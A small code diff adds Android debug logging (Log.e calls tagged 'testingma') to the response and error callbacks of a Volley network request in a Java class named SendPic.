@@ -1,6 +1,7 @@
 package com.google.cloudservices;
 
 import android.content.Context;
+import android.util.Log;
 
 import com.android.volley.Cache;
 import com.android.volley.Network;
@@ -36,6 +37,7 @@ public class SendPic {
                     new Response.Listener<String>() {
                         @Override
                         public void onResponse(String response) {
+                            Log.e("testingma", response );
                             requestQueue.stop();
 
                             try {
@@ -60,6 +62,7 @@ public class SendPic {
                     }, new Response.ErrorListener() {
                 @Override
                 public void onErrorResponse(VolleyError error) {
+                    Log.e("testingma", error.toString() );
 
                     //sm.add(context,url,key,jsonarray);
                 }
